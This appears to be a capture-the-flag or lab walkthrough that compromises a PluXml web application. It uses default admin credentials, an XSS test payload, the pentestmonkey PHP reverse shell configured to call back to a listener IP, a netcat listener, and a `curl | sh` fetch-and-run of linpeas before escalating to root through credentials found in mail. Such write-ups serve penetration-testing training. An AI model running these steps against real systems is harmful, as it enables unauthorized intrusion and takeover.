# Recon

## Nmap
```
nmap -sC -sV -p- --open <ip>
```

![nmap](./nmap.png)
There is a web application built with PluXml.

---

Browsing the web application, there is an admin login.
![admin](./admin.png)

The login credentials are simple `admin:admin`
![login](./login.png)

Notice that the url ends in `.php` like `http://192.168.165.28/core/admin/index.php?page=1`
- Also, the version of PluXml is shown 

Searching for the version of PluXml unveils a [remote code execution exploit and a cross site scripting vulnerability](https://github.com/MoritzHuppert/CVE-2022-25018/blob/main/CVE-2022-25018.pdf).


# Cross-Site Scripting
An article can be created with the following
1. Click on **New Article**
2. In any input box, use the following payload
```
<script>alert(1)</script>
```
- This will inject a JavaScript script and will run under the context of the user who clicks on the link to the article seen below
![xss](./xss.png)

3. Save the draft and publish the article.

When clicking on the link that is generated after publishing the article, an alert is generated. This confirms the cross-site scripting vulnerability.
- In this case the link is `http://192.168.165.28/index.php?article2/test1`

## Remote Code Execution
Go to **Static Pages** and edit a page.
- [Use this PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

Replace the content with the php script.
- replace the IP address for your listener IP
- use the port that is configured to listen (4444)
```
$VERSION = "1.0";
$ip = '192.168.45.212';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
```

Start a netcat listener in a linux command line.
``` bash
nc -lnvp 4444
```

Save the page and click **View page Static 1 on site**
- a connection will be made with the php server
![shell](./shell.png)

### Linux Privilege Escalation
#### Linpeas.sh
Using [linpeas.sh](https://linpeas.sh/), start a python server in the directory with linpeas.sh
```
┌──(kali㉿kali)-[/opt]
└─$ ls            
linpeas.sh

┌──(kali㉿kali)-[/opt]
└─$ python3 -m http.server 80                                                   
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

In the netcat listener run the following command to fetch and run the `.sh` script.
```
curl {IP}/linpeas.sh | sh
```

Going through the linpeas output, there is an interesting mail section
![mail](./mail.png)

Looking at the contents of `/var/mail/www-data` the credentials for the root user can be found
![root](./root.png)

Use this password when switching to the root user with `su root`
![switch](./switch.png)

The flag (local.txt) can be found in the `/var/www` directory.
The flag (proof.txt) can be found in the `/root` directory.

# Summary

Vulnerabilities in the PluXml web application were exploited, including an **_XSS flaw_** and **_remote code execution_**. I was able to gain access, escalate privileges using Linpeas.sh, and find root credentials in mail logs
